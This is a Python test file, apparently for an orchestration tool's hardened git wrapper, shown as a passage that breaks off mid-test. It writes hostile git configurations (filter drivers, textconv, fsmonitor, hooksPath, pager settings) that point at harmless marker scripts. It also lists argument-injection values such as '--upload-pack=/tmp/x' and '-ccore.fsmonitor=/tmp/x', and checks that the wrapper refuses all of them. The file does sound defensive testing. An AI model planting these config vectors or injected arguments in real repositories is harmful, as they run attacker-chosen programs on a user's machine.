"""#546: ``store/observe`` and ``ops/health`` meet the invariant of :mod:`orch.gitsafe`
(:data:`orch.gitsafe.ISOLATION`): no configuration the person or a repo controls is read except through an explicit
allow-list, and git runs only the closed set of operations of :data:`orch.gitsafe.OPS` (no caller-chosen argument
reaches git as an option).

Every vector has a **positive control**: plain git with the hostile configuration runs the vector's program, so the
test would catch a regression. Then every operation of the caller runs on an identical fresh repository: no program
runs, and each result equals the result under an empty ``HOME``.
"""

from __future__ import annotations

import os
import pty
import shutil
import subprocess
from pathlib import Path

import pytest

from orch import gitsafe
from orch.ops import health
from orch.ops.caps import Capabilities
from orch.store import observe

FIXED_DATE = "2026-01-01T00:00:00+00:00"
#: every plain git run of the tests has an identity: a control that needs one (``diff.<d>.cachetextconv`` writes a
#: notes commit) must not fail silently on a machine without one (the CI runner: "Author identity unknown", rc 128)
IDENTITY = ("-c", "user.name=t", "-c", "user.email=t@example.invalid")


#: a minimal long-running filter process (git's pkt-line protocol, version 2): it records its start and hands every
#: blob back unchanged, so a positive control through ``filter.<d>.process`` succeeds (rc 0)
_PROCESS = r"""#!/usr/bin/env python3
import sys
inp, out = sys.stdin.buffer, sys.stdout.buffer
open(MARK, "a").write("ran\n")
def read():
    n = inp.read(4)
    if not n:
        sys.exit(0)
    n = int(n, 16)
    return None if n == 0 else inp.read(n - 4)
def until_flush():
    items = []
    while (p := read()) is not None:
        items.append(p)
    return items
def write(*lines):
    for line in lines:
        data = line if isinstance(line, bytes) else (line + "\n").encode()
        out.write(b"%04x" % (len(data) + 4) + data)
    out.write(b"0000")
    out.flush()
until_flush(); write("git-filter-server", "version=2")
until_flush(); write("capability=clean", "capability=smudge")
while True:
    until_flush()
    content = b"".join(until_flush())
    write("status=success")
    for i in range(0, len(content), 65000):
        out.write(b"%04x" % (len(content[i:i + 65000]) + 4) + content[i:i + 65000])
    write()
    write()
"""


def _prog(bin_dir: Path, mark: Path, name: str) -> str:
    """An executable that records each run as one line in ``mark/name``, then behaves enough like the real thing.
    Positive controls require at least one line, orch runs exactly none ("exactly once" is not deterministic: a
    textconv runs once per side of a diff)."""
    p = bin_dir / name
    if name.endswith("process"):
        p.write_text(_PROCESS.replace("MARK", repr(str(mark / name))))
        p.chmod(0o755)
        return str(p)
    body = {"clean": "exec cat", "smudge": "exec cat", "textconv": 'exec cat "$1"'}.get(name.split("-")[-1], "exit 0")
    if name.startswith("pager"):
        body = "exec cat > /dev/null"  # read everything: git must not die of SIGPIPE (rc -13 on Linux)
    p.write_text(f'#!/bin/sh\necho ran >> "{mark / name}"\n{body}\n')
    p.chmod(0o755)
    return str(p)


@pytest.fixture
def world(tmp_path, monkeypatch):
    """A hostile ``HOME`` (its ``.gitconfig`` written per test), an empty one for the baseline, the marker dir."""
    w = type("W", (), {})()
    w.tmp = tmp_path
    w.home = tmp_path / "home"
    w.empty = tmp_path / "empty-home"
    w.bin = tmp_path / "bin"
    w.mark = tmp_path / "mark"
    for d in (w.home, w.empty, w.bin, w.mark):
        d.mkdir()
    for k in list(os.environ):
        if k.startswith("GIT_") or k == "XDG_CONFIG_HOME":
            monkeypatch.delenv(k)
    monkeypatch.setenv("HOME", str(w.home))
    w.monkeypatch = monkeypatch

    def env(home: Path) -> dict[str, str]:
        return {"HOME": str(home), "PATH": os.environ.get("PATH", "/usr/bin:/bin"), "LANG": "C", "LC_ALL": "C",
                "GIT_CONFIG_NOSYSTEM": "1", "GIT_TERMINAL_PROMPT": "0", "GIT_AUTHOR_DATE": FIXED_DATE,
                "GIT_COMMITTER_DATE": FIXED_DATE}  # fmt: skip

    w.env = env

    def git(repo: Path, *args: str, home: Path | None = None, check: bool = True) -> subprocess.CompletedProcess:
        """Plain git (no isolation), under ``home`` (default: the empty one, for setup)."""
        return subprocess.run(
            ["git", "-c", "credential.helper=", "-c", "protocol.file.allow=always", *IDENTITY, "-C", str(repo), *args],
            capture_output=True, text=True, env=env(home or w.empty), stdin=subprocess.DEVNULL, check=check,
            timeout=60,
        )  # fmt: skip

    w.git = git
    w.prog = lambda name: _prog(w.bin, w.mark, name)
    w.fired = lambda: {p.name for p in w.mark.iterdir()}
    w.count = lambda name: len((w.mark / name).read_text().splitlines()) if (w.mark / name).exists() else 0

    def control(repo: Path, *args: str, fires: tuple[str, ...] | list[str], home: Path | None = None):
        """A positive control in plain git: it must succeed (rc 0) and run EACH program in ``fires`` at least once;
        a silent no-fire fails the test."""
        res = git(repo, *args, home=home, check=False)
        assert res.returncode == 0, f"positive control {args} failed: {res.stderr[-400:]}"
        missing = [n for n in fires if w.count(n) < 1]
        assert not missing, f"positive control {args}: {missing} did not run"
        return res

    w.control = control

    def clear() -> None:
        for p in w.mark.iterdir():
            p.unlink()

    w.clear = clear

    def gitconfig(entries: dict[str, str], attrs: str | None = None) -> None:
        lines = []
        if attrs is not None:
            (w.home / "attributes").write_text(attrs)
            entries = {"core.attributesFile": str(w.home / "attributes"), **entries}
        for k, v in entries.items():
            section, _, name = k.rpartition(".")
            head, _, sub = section.partition(".")
            lines.append(f'[{head} "{sub}"]' if sub else f"[{head}]")
            lines.append(f"\t{name} = {v}")
        (w.home / ".gitconfig").write_text("\n".join(lines) + "\n")

    w.gitconfig = gitconfig
    return w


def make_repo(w, where: str, *, attrs: str | None = None) -> Path:
    """``<where>/r``: a committed repo (``a.g``, ``b.txt``, optional ``.gitattributes``; fixed dates, so the same
    commit ids everywhere) with ``a.g`` changed in the work tree (same size, newer mtime: git must read it), a staged
    change of ``b.txt`` (newer mtime too), and a bare ``<where>/dst.git`` that borrows its objects."""
    base = w.tmp / where
    base.mkdir()
    repo = base / "r"
    repo.mkdir()
    w.git(repo, "init", "-q", "-b", "main")
    (repo / "a.g").write_text("one\n")
    (repo / "b.txt").write_text("bee\n")
    if attrs is not None:
        (repo / ".gitattributes").write_text(attrs)
    w.git(repo, "add", "-A")
    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "c1")
    (repo / "b.txt").write_text("bee2\n")
    w.git(repo, "add", "b.txt")
    (repo / "a.g").write_text("two\n")
    for f in ("a.g", "b.txt"):  # b.txt: same content, newer stat, so a plain refresh always writes the index
        st = (repo / f).stat()
        os.utime(repo / f, (st.st_atime + 10, st.st_mtime + 10))
    dst = base / "dst.git"
    w.git(base, "init", "-q", "--bare", str(dst))
    (dst / "objects" / "info" / "alternates").write_text(str(repo / ".git" / "objects") + "\n")
    w.clear()
    return repo


def sample_operands(spec: gitsafe.Op) -> tuple[str, ...] | None:
    """A valid operand for each slot of ``spec``."""
    sample = {"rev": "refs/heads/main", "path": "b.txt", "context": "3"}
    return tuple(sample[k] for k in spec.operands) or None


def run_all(caller: str, repo: Path) -> dict:
    """Every operation the caller has, on ``repo`` (paths of the repo replaced, so results compare across repos)."""
    if caller == "observe":
        out = {
            "head": observe.head(repo),
            "symbolic_head": observe.symbolic_head(repo),
            "toplevel": observe.toplevel(repo),
            "porcelain": observe.porcelain(repo),
            "dirty": observe.dirty(repo),
            "ref": observe.git(repo, "ref", rev="refs/heads/main"),
            "commit": observe.git(repo, "commit", rev="refs/heads/main"),
            "identity": observe.repo_identity(repo, "r"),
        }
        if out["toplevel"] is not None:
            out["toplevel"] = out["toplevel"].replace(os.path.realpath(repo), "<repo>")
        return out
    caps = Capabilities.direct()
    return {
        "gate": health._gate(repo, caps),
        "staged_raw": health._git(repo, "staged_raw", caps=caps),
        "blob_b": health._git(repo, "staged_blob", caps=caps, path="b.txt"),
        "blob_a": health._git(repo, "staged_blob", caps=caps, path="a.g"),
    }


#: (vector, its global config, the core.attributesFile content or None, the plain git command that runs it)
GLOBAL_VECTORS = [
    ("filter-clean", {"filter.evil.clean": "{filter-clean}"}, "*.g filter=evil\n", ["status", "--porcelain"]),
    ("filter-smudge", {"filter.evil.smudge": "{filter-smudge}"}, "*.g filter=evil\n",
     ["checkout-index", "-f", "--", "a.g"]),
    ("filter-process", {"filter.evil.process": "{filter-process}"}, "*.g filter=evil\n", ["status", "--porcelain"]),
    ("diff-external", {"diff.external": "{diff-external}"}, None, ["diff"]),
    ("diff-textconv", {"diff.evil.textconv": "{diff-textconv}"}, "*.g diff=evil\n", ["diff"]),
    ("fsmonitor", {"core.fsmonitor": "{fsmonitor}"}, None, ["status", "--porcelain"]),
    ("post-index-change", {"core.hooksPath": "{hooks}"}, None, ["update-index", "-q", "--refresh"]),
    ("alternate-refs", {"core.alternateRefsCommand": "{alternate-refs}"}, None, ["push", "{dst}", "HEAD:refs/heads/x"]),
]  # fmt: skip


def _hostile(w, entries: dict[str, str]) -> dict[str, str]:
    hooks = w.tmp / "hooks"
    hooks.mkdir(exist_ok=True)
    for hook in ("post-index-change", "pre-commit", "reference-transaction", "pre-push", "pre-receive", "update",
                 "post-update"):  # fmt: skip
        _prog(hooks, w.mark, hook)
    out = {}
    for k, v in entries.items():
        if v == "{hooks}":
            out[k] = str(hooks)
        elif v.startswith("{"):
            out[k] = w.prog(v.strip("{}"))
        else:
            out[k] = v
    return out


@pytest.mark.parametrize("caller", ["observe", "health"])
@pytest.mark.parametrize("vector,entries,attrs,trigger", GLOBAL_VECTORS, ids=[v[0] for v in GLOBAL_VECTORS])
def test_a_hostile_global_config_runs_nothing_and_changes_no_result(world, caller, vector, entries, attrs, trigger):
    w = world
    w.gitconfig(_hostile(w, entries), attrs)
    # positive control: plain git with this HOME runs the vector's program
    plain = make_repo(w, "plain")
    w.control(plain, *[a.replace("{dst}", str(plain.parent / "dst.git")) for a in trigger], fires=[vector], home=w.home)
    w.clear()
    # every operation of the caller: nothing runs
    got = run_all(caller, make_repo(w, "hostile"))
    assert w.fired() == set(), f"{caller} ran {w.fired()}"
    # and every result is what it is with no person config at all
    w.monkeypatch.setenv("HOME", str(w.empty))
    assert got == run_all(caller, make_repo(w, "base"))
    if caller == "observe":
        assert got["head"] is not None and got["porcelain"] is not None and got["commit"] == got["head"]
    else:
        assert got["staged_raw"] is not None and got["blob_b"] == b"bee2\n"


def _all_hostile(w) -> None:
    (w.home / "inc").write_text("[core]\n\tsshCommand = evil\n")
    w.gitconfig(
        _hostile(w, {
            "filter.evil.clean": "{x}", "filter.evil.smudge": "{x}", "filter.evil.process": "{x}",
            "diff.external": "{x}", "diff.evil.textconv": "{x}", "core.pager": "{x}", "pager.log": "{x}",
            "core.alternateRefsCommand": "{x}", "core.fsmonitor": "{x}", "core.hooksPath": "{hooks}",
            "core.editor": "{x}", "alias.st": "!{x}", "include.path": str(w.home / "inc"),
            "core.excludesFile": str(w.home / "ignore"),
        }),
        "*.g filter=evil diff=evil\n",
    )  # fmt: skip


#: every key of the hostile global config the tests write
ALL_HOSTILE = {
    "core.attributesfile", "filter.evil.clean", "filter.evil.smudge", "filter.evil.process", "diff.external",
    "diff.evil.textconv", "core.pager", "pager.log", "core.alternaterefscommand", "core.fsmonitor", "core.hookspath",
    "core.editor", "alias.st", "include.path", "core.sshcommand", "core.excludesfile",
}  # fmt: skip


@pytest.mark.parametrize("op", sorted(gitsafe.OPS))
def test_no_key_of_the_persons_config_reaches_any_operation(world, op):
    w = world
    _all_hostile(w)
    repo = make_repo(w, "r")
    plain = w.git(repo, "config", "--list", "--show-scope", home=w.home).stdout.lower()
    assert all(k in plain for k in ALL_HOSTILE)  # positive control
    operand = sample_operands(gitsafe.OPS[op])
    argv, env = gitsafe.command(str(repo), op, os.environ, operand=operand)
    # the configuration that operation's environment and global options give git, listed by git itself
    listing = subprocess.run(
        [*argv[: argv.index("-C") + 2], "config", "--list", "--show-scope"], env=env, capture_output=True,
        text=True, check=True, cwd="/",
    ).stdout.lower()  # fmt: skip
    scopes = {line.split("\t", 1)[0] for line in listing.splitlines()}
    assert scopes <= {"local", "command"}, scopes
    keys = {line.split("\t", 1)[1].split("=", 1)[0] for line in listing.splitlines() if line.startswith("command")}
    person = {"core.excludesfile"} if op == "status" else set()
    if gitsafe.OPS[op].args[0] == "diff":  # orch's own pins of every diff knob (orch-52 on #561)
        person |= {kv.split("=", 1)[0].lower() for kv in gitsafe._DIFF_PINS[1::2]}
        person |= {f"diff.{d}.{n}" for d in gitsafe.BUILTIN_DRIVERS for n in ("binary", "xfuncname", "funcname")}
    assert keys == {
        "core.hookspath", "core.fsmonitor", "protocol.allow", "submodule.recurse", "core.attributesfile",
        "i18n.commitencoding", "core.commitgraph", "core.trustctime", "core.checkstat", "advice.graftfiledeprecated",
    } | person  # fmt: skip
    assert "core.attributesfile=/dev/null" in listing and "core.hookspath=/dev/null" in listing
    assert w.fired() == set()


def test_status_keeps_only_its_own_allow_list_and_the_global_ignore_still_counts(world):
    w = world
    _all_hostile(w)
    (w.home / "ignore").write_text("*.ignored\n")
    repo = make_repo(w, "r")
    (repo / "x.ignored").write_text("x\n")
    status = observe.porcelain(repo)
    assert status is not None and "x.ignored" not in status and "a.g" in status
    assert w.fired() == set()


def test_no_operation_runs_a_pager_even_on_a_terminal(world):
    w = world
    w.gitconfig(_hostile(w, {"core.pager": "{pager}", "pager.log": "{pager-log}"}))
    repo = make_repo(w, "r")

    def on_tty(argv: list[str], env: dict[str, str]) -> int:
        master, slave = pty.openpty()
        try:
            return subprocess.run(
                argv, stdin=subprocess.DEVNULL, stdout=slave, stderr=slave, env=env, timeout=30, check=False
            ).returncode
        finally:
            os.close(slave)
            os.close(master)

    # positive controls: each pager runs in plain git on a terminal
    assert on_tty(["git", "-C", str(repo), "log"], w.env(w.home)) == 0 and w.count("pager-log") >= 1
    assert on_tty(["git", "-C", str(repo), "show"], w.env(w.home)) == 0 and w.count("pager") >= 1
    w.clear()
    for op, spec in gitsafe.OPS.items():
        operand = sample_operands(spec)
        on_tty(*gitsafe.command(str(repo), op, os.environ, operand=operand))
    assert w.fired() == set()


# ----------------------------------------------------------------------- the closed set: no argument injection


def test_operations_are_a_closed_set_with_no_network_subcommand():
    allowed = {"rev-parse", "symbolic-ref", "merge-base", "status", "ls-files", "diff", "cat-file"}
    assert {op.args[0] for op in gitsafe.OPS.values()} <= allowed
    assert not hasattr(gitsafe, "argv")  # the free-argv builder is gone
    from orch.ops.caps import Git

    assert not hasattr(Git, "run")  # ops/caps.Git.run (free argv) is gone


INJECTED_REVS = [
    "-c", "-ccore.fsmonitor=/tmp/x", "-C/tmp/hostile", "--git-dir=/tmp/x", "--work-tree=/tmp/x", "--exec-path=/tmp",
    "--namespace=x", "--config-env=core.pager=X", "-p", "--upload-pack=/tmp/x", "--output=/tmp/x", "refs/heads/-x",
    "refs/heads/a..b", "refs/heads/x@{1}", "refs/heads/x/", "refs/heads/x.lock", "HEAD:a", "x", "refs/tags/v1",
    "refs/heads/x\n--all", "",
]  # fmt: skip


@pytest.mark.parametrize("rev", INJECTED_REVS)
def test_an_injected_revision_never_reaches_git(world, monkeypatch, rev):
    repo = make_repo(world, "r")
    ran: list = []
    real = subprocess.run
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: ran.append(a) or real(*a, **k))
    for op in ("ref", "commit"):
        with pytest.raises(gitsafe.Unsafe):
            gitsafe.command(str(repo), op, os.environ, operand=rev)
        assert observe.git(repo, op, rev=rev) is None
    assert ran == []  # refused before the gate: not even the gate's git ran


@pytest.mark.parametrize("op,operand", [("-c", None), ("status", "-c"), ("head", "x"), ("push", None),
                                        ("staged_blob", "/etc/passwd"), ("staged_blob", "a\nb")])  # fmt: skip
def test_an_unknown_operation_or_an_operand_where_none_belongs_is_refused(world, op, operand):
    repo = make_repo(world, "r")
    with pytest.raises(gitsafe.Unsafe):
        gitsafe.command(str(repo), op, os.environ, operand=operand)


@pytest.mark.parametrize("path", ["--upload-pack=/tmp/x", "-c", "--git-dir=/x", "-", ":/x", "1:b.txt"])
def test_a_leading_dash_or_special_path_is_only_ever_an_index_path(world, path):
    w = world
    repo = make_repo(w, "r")
    argv, _env = gitsafe.command(str(repo), "staged_blob", os.environ, operand=path)
    assert argv[-1] == f":0:./{path}"  # an object name: stage 0 of that path below -C, never an option or :/ search
    caps = Capabilities.direct()
    assert health._git(repo, "staged_blob", caps=caps, path=path) is None  # no such file in the index
    (repo / path.replace("/", "_")).write_text("dash\n")
    w.git(repo, "--literal-pathspecs", "add", "--", path.replace("/", "_"))
    assert health._git(repo, "staged_blob", caps=caps, path=path.replace("/", "_")) == b"dash\n"
    assert w.fired() == set()


def test_the_repository_is_always_the_one_named_never_one_an_argument_names(world):
    w = world
    hostile = make_repo(w, "hostile")
    w.git(hostile, "config", "filter.r.clean", w.prog("repo-clean"))  # would be refused by the gate
    repo = make_repo(w, "plain")
    for rev in (f"-C{hostile}", f"--git-dir={hostile}/.git"):
        assert observe.git(repo, "ref", rev=rev) is None
    assert observe.head(repo) is not None  # the named repo still reads
    assert w.fired() == set()


# ---------------------------------------------------------------------------------------------------- submodules


def _populated_submodule(w, repo: Path) -> Path:
    """``repo/sub``: a checked-out submodule whose OWN config defines a clean filter and an fsmonitor program."""
    src = repo.parent / "subsrc"
    src.mkdir()
    w.git(src, "init", "-q", "-b", "main")
    (src / "s.g").write_text("one\n")
    (src / ".gitattributes").write_text("*.g filter=sub\n")
    w.git(src, "add", "-A")
    w.git(src, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "s")
    w.git(repo, "submodule", "-q", "add", str(src), "sub")
    sub = repo / "sub"
    w.git(sub, "config", "filter.sub.clean", w.prog("sub-clean"))
    w.git(sub, "config", "core.fsmonitor", w.prog("sub-fsmonitor"))
    (sub / "s.g").write_text("two\n")
    st = (sub / "s.g").stat()
    os.utime(sub / "s.g", (st.st_atime + 10, st.st_mtime + 10))
    w.clear()
    return sub


def test_a_populated_submodule_with_a_hostile_filter_runs_nothing(world, monkeypatch):
    w = world
    plain = make_repo(w, "plain")
    _populated_submodule(w, plain)
    w.control(plain, "status", "--porcelain", fires=["sub-clean", "sub-fsmonitor"])  # its own config runs
    w.clear()
    repo = make_repo(w, "repo")
    _populated_submodule(w, repo)
    assert observe.porcelain(repo) is None and observe.dirty(repo) is None  # refused: unknown, never clean
    raw = health._git(repo, "staged_raw", caps=Capabilities.direct())  # diff --cached never opens a submodule
    assert raw is not None and gitsafe.gitlinks(raw) == ["sub"]
    assert w.fired() == set()
    # the operation itself shields: even with the refusal switched off, status never opens the submodule
    monkeypatch.setattr(gitsafe, "submodules", lambda *a, **k: None)
    assert observe.porcelain(repo) is not None
    assert w.fired() == set()


def test_a_staged_gitlink_change_is_still_uncommitted_work(world):
    w = world
    repo = make_repo(w, "r")
    sub = _populated_submodule(w, repo)  # the gitlink is staged, not committed
    shutil.rmtree(sub)
    sub.mkdir()  # unpopulated, as after a clone without --recurse-submodules
    got = observe.dirty(repo)
    assert got is not None and "staged submodule change: sub" in got.splitlines()
    assert w.fired() == set()


# ------------------------------------------------------------------------------------------- the repo's own config


def _hostile_repo(w, where: str) -> Path:
    """The PoC-439 class: a committed ``.gitattributes`` selects a driver that the repo's own ``.git/config``
    defines (``filter.r.clean``, ``diff.r.textconv``)."""
    repo = make_repo(w, where, attrs="*.g filter=r diff=r\n*.txt diff=r\n")
    w.git(repo, "config", "filter.r.clean", w.prog("repo-clean"))
    w.git(repo, "config", "diff.r.textconv", w.prog("repo-textconv"))
    return repo


def test_observe_runs_no_program_of_a_hostile_repo_config(world):
    w = world
    plain = _hostile_repo(w, "plain")
    w.control(plain, "status", "--porcelain", fires=["repo-clean"])  # the command observe's status runs
    assert w.fired() == {"repo-clean"}
    w.clear()
    repo = _hostile_repo(w, "repo")
    got = run_all("observe", repo)
    assert {k: v for k, v in got.items() if k != "identity"} == dict.fromkeys(got.keys() - {"identity"})
    # reading the repo's config as data (F1 5.7's identity) is the gate's own listing: it runs nothing
    w.git(repo, "remote", "add", "origin", "https://github.com/acme/x")
    assert observe.repo_identity(repo, "x") == "https://github.com/acme/x"
    assert w.fired() == set()


def test_a_local_hookspath_or_fsmonitor_program_never_runs_through_observe(world):
    w = world
    hooks = w.tmp / "hooks"
    hooks.mkdir()
    _prog(hooks, w.mark, "post-index-change")
    plain = make_repo(w, "plain")
    w.git(plain, "config", "core.hooksPath", str(hooks))
    w.control(plain, "update-index", "-q", "--refresh", fires=["post-index-change"])
    assert w.fired() == {"post-index-change"}
    w.clear()
    repo = make_repo(w, "repo")
    w.git(repo, "config", "core.hooksPath", str(hooks))  # on the allow-list (husky): -c overrides it
    assert run_all("observe", repo)["head"] is not None
    assert w.fired() == set()
    w.git(repo, "config", "core.fsmonitor", w.prog("fsmonitor"))
    w.git(plain, "config", "core.fsmonitor", str(w.bin / "fsmonitor"))
    w.control(plain, "status", "--porcelain", fires=["fsmonitor"])
    w.clear()
    assert observe.porcelain(repo) is None  # a program as core.fsmonitor: refused
    assert w.fired() == set()


def test_health_runs_no_program_of_a_hostile_repo_config(world):
    w = world
    plain = _hostile_repo(w, "plain")
    w.control(plain, "diff", "--cached", fires=["repo-textconv"])  # health's diff, in plain git (patch form)
    w.control(plain, "status", "--porcelain", fires=["repo-clean"])
    w.clear()
    repo = _hostile_repo(w, "repo")
    got = run_all("health", repo)
    assert got["gate"] is not None and "filter.r.clean" in got["gate"]
    assert got["staged_raw"] is None and got["blob_b"] is None  # _git gates itself too
    assert w.fired() == set()


def test_orch_check_staged_refuses_a_workspace_repo_whose_config_could_run_a_program(ws, cli, world):
    from tests.ops.test_check import check

    w = world
    w.monkeypatch.setenv("HOME", str(w.empty))
    root = ws.root
    for args in (["init", "-q"], ["config", "user.email", "t@t"], ["config", "user.name", "t"]):
        w.git(root, *args)
    (root / ".gitattributes").write_text("*.json filter=r\n")
    w.git(root, "add", "-f", ".gitattributes")
    w.git(root, "config", "filter.r.clean", w.prog("repo-clean"))
    w.clear()
    r = check(ws, "--staged")
    found = [f["what"] for f in r.data["findings"]]
    assert any("git.unavailable" in f and "filter.r.clean" in f for f in found), found
    assert w.fired() == set()


def test_the_isolated_environment_is_built_from_scratch():
    own = {"HOME": "/h", "PATH": "/p", "GIT_DIR": "/x", "GIT_CONFIG_PARAMETERS": "'core.pager'='x'",
           "GITHUB_TOKEN": "t", "ORCH_GRANT": "g", "GIT_CONFIG_GLOBAL": "/evil", "XDG_CONFIG_HOME": "/x"}  # fmt: skip
    env = gitsafe.isolated_env(own, [("core.excludesFile", "/i")])
    assert env["GIT_CONFIG_NOSYSTEM"] == "1" and env["GIT_CONFIG_GLOBAL"] == os.devnull
    assert env["GIT_CONFIG_COUNT"] == "1" and env["GIT_CONFIG_KEY_0"] == "core.excludesFile"
    assert "GIT_DIR" not in env and "GIT_CONFIG_PARAMETERS" not in env and "GITHUB_TOKEN" not in env
    assert "ORCH_GRANT" not in env and env["GIT_ALLOW_PROTOCOL"] == "" and env["GIT_NO_LAZY_FETCH"] == "1"


# ----------------------------------------------------------------------------- the gate fails closed, on every path


def _no_git_after_a_failed_gate(monkeypatch, exc: BaseException) -> list:
    """``gitsafe.gate`` raises ``exc``; every later ``subprocess.run`` (the git command itself) is recorded."""
    ran: list = []

    def gate(repo, own, **kw):
        raise exc

    monkeypatch.setattr(gitsafe, "gate", gate)
    real = subprocess.run
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: ran.append(a) or real(*a, **k))
    return ran


@pytest.mark.parametrize("exc", [gitsafe.Unsafe("refused"), gitsafe.Unsafe("checking the config timed out")])
def test_no_operation_runs_git_when_the_gate_refuses(world, monkeypatch, exc):
    repo = make_repo(world, "r")
    ran = _no_git_after_a_failed_gate(monkeypatch, exc)
    got = run_all("observe", repo)
    assert {k: v for k, v in got.items() if k != "identity"} == dict.fromkeys(got.keys() - {"identity"})
    got = run_all("health", repo)
    assert got == {"gate": exc.reason, "staged_raw": None, "blob_b": None, "blob_a": None}
    assert ran == []  # git itself was never started


def test_an_unexpected_gate_error_propagates_and_never_falls_through_to_git(world, monkeypatch):
    repo = make_repo(world, "r")
    ran = _no_git_after_a_failed_gate(monkeypatch, RuntimeError("boom"))
    with pytest.raises(RuntimeError):
        observe.porcelain(repo)
    assert ran == []


def test_a_config_that_cannot_be_listed_is_refused(world):
    w = world
    repo = make_repo(w, "r")
    cfg = repo / ".git" / "config"
    cfg.chmod(0o000)
    try:
        assert observe.head(repo) is None and observe.porcelain(repo) is None
        assert observe.repo_identity(repo, "r") == "local:r"  # the listing failed: local, never a guess
    finally:
        cfg.chmod(0o644)
    assert observe.head(repo) is not None  # the same repo, readable again


def test_health_check_staged_never_runs_git_when_the_gate_refuses(world, monkeypatch, ws):
    repo = make_repo(world, "r")
    caps = Capabilities.direct()
    _no_git_after_a_failed_gate(monkeypatch, gitsafe.Unsafe("refused"))
    ran = []
    monkeypatch.setattr(health, "_git", lambda *a, **k: ran.append(a))
    store = ws.other()
    try:
        found = health.check_staged(store, repo, caps)
    finally:
        store.close()
    assert [f.code for f in found] == ["git.unavailable"] and "refused" in found[0].what
    assert ran == []


def test_a_git_too_old_for_the_isolation_is_refused(world, monkeypatch):
    repo = make_repo(world, "r")
    path = gitsafe.isolated_env(os.environ)["PATH"]
    monkeypatch.setitem(gitsafe._VERSIONS, path, (2, 31))  # GIT_CONFIG_GLOBAL would be ignored silently
    with pytest.raises(gitsafe.Unsafe, match="too old"):
        gitsafe.gate(str(repo), os.environ)
    assert observe.head(repo) is None
    monkeypatch.setitem(gitsafe._VERSIONS, path, (2, 32))
    assert observe.head(repo) is not None


def test_refusal_names_the_gates_reason_only_for_a_repository(world, tmp_path):
    w = world
    repo = _hostile_repo(w, "r")
    assert "filter.r.clean" in observe.refusal(repo)
    assert observe.refusal(make_repo(w, "ok")) is None
    (tmp_path / "nogit").mkdir()
    assert observe.refusal(tmp_path / "nogit") is None
    assert w.fired() == set()


def test_every_revision_of_a_diff_operation_is_validated_and_followed_by_the_end_of_revisions(world):
    repo = make_repo(world, "r")
    head = observe.head(repo)
    for op in ("diff_numstat", "diff_names", "diff_patch", "merge_base"):
        spec = gitsafe.OPS[op]
        argv, _env = gitsafe.command(str(repo), op, os.environ, operand=sample_operands(spec))
        assert argv[-1] == "--" and "--ignore-submodules=dirty" in argv or op == "merge_base"
        for bad in ("--output=/tmp/x", "-c", f"{head}..{head}", "HEAD~1"):
            values = list(sample_operands(spec))
            values[-1] = bad
            with pytest.raises(gitsafe.Unsafe):
                gitsafe.command(str(repo), op, os.environ, operand=tuple(values))
    with pytest.raises(gitsafe.Unsafe):  # the context is 0 to 10 lines, nothing else
        gitsafe.command(str(repo), "diff_patch", os.environ, operand=("11", head, head))
    assert observe.git(repo, "diff_numstat", rev=(head, head)) == ""


def test_a_unicode_branch_name_works_and_its_revision_follows_end_of_options(world):
    w = world
    repo = make_repo(w, "r")
    for name in ("übung", "feat/Ärger-ß", "日本語/ブランチ", "a.b_c+d@e"):
        w.git(repo, "branch", name)
        head = observe.git(repo, "commit", rev=f"refs/heads/{name}")
        assert head is not None and head == observe.head(repo), name
        argv, _env = gitsafe.command(str(repo), "commit", os.environ, operand=f"refs/heads/{name}")
        assert argv[-2:] == ["--end-of-options", f"refs/heads/{name}^{{commit}}"]
    assert observe.git(repo, "merge_base", rev=(observe.head(repo), "refs/heads/übung")) == observe.head(repo)
    for op in ("ref", "commit", "parent", "merge_base", "diff_numstat", "diff_names", "diff_patch"):
        argv, _env = gitsafe.command(str(repo), op, os.environ, operand=sample_operands(gitsafe.OPS[op]))
        first_rev = next(i for i, a in enumerate(argv) if a.startswith("refs/heads/"))
        assert argv[first_rev - 1] == "--end-of-options" or argv[first_rev - 2] == "--end-of-options", op


@pytest.mark.parametrize(
    "name",
    ["-x", "a..b", "a@{1}", "a:b", "a\\b", "a~1", "a^", "a?", "a*", "a[b", "a b", "a\tb", "a b", "a b",
     "x.lock", "x/", "a//b", "a\x01b", "a\x7fb", "a\u0085b", ".hidden", "a/.b", "x.", "@", "", "a" * 256],
)  # fmt: skip
def test_each_form_git_refuses_in_a_branch_name_is_refused(world, name):
    repo = make_repo(world, "r")
    with pytest.raises(gitsafe.Unsafe):
        gitsafe.command(str(repo), "commit", os.environ, operand=f"refs/heads/{name}")
    assert observe.git(repo, "commit", rev=f"refs/heads/{name}") is None


def test_the_too_old_message_says_what_is_needed(monkeypatch):
    path = gitsafe.isolated_env(os.environ)["PATH"]
    monkeypatch.setitem(gitsafe._VERSIONS, path, (2, 31))
    with pytest.raises(gitsafe.Unsafe) as e:
        gitsafe.git_version(os.environ)
    assert "2.32 or newer" in e.value.reason and "update git" in e.value.reason


def test_merge_base_returns_the_real_fork_point_of_two_branches(world):
    """A fork point with commits on both sides: ``merge_base`` names the fork, not either head or a parent (a5283877
    ended the operation with ``--``, which merge-base rejects, so it returned nothing)."""
    w = world
    repo = make_repo(w, "r")
    commit = ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m"]
    w.git(repo, *commit, "fork")
    fork = observe.head(repo)
    w.git(repo, "switch", "-q", "-c", "side")
    w.git(repo, *commit, "side 1")
    w.git(repo, *commit, "side 2")
    w.git(repo, "switch", "-q", "main")
    w.git(repo, *commit, "main 1")
    main = observe.git(repo, "commit", rev="refs/heads/main")
    side = observe.git(repo, "commit", rev="refs/heads/side")
    assert len({fork, main, side}) == 3
    assert observe.git(repo, "merge_base", rev=(side, "refs/heads/main")) == fork
    assert observe.git(repo, "merge_base", rev=("refs/heads/side", main)) == fork
    assert observe.git(repo, "parent", rev=side) != fork  # the fallback would be wrong here


# ------------------------------------------------- Opus delta 2 on #561: subdirectory roots, pointer moves, operands


def test_check_staged_reads_the_workspace_file_not_a_decoy_at_the_top(world):
    """M1 (probe 6): the workspace is a subdirectory of its repo. ``staged_raw`` lists paths relative to it, and
    ``staged_blob`` must read exactly those files, not same-named ones at the repo's top."""
    w = world
    top = w.tmp / "top"
    (top / "ws" / "tickets" / "X").mkdir(parents=True)
    (top / "tickets" / "X").mkdir(parents=True)
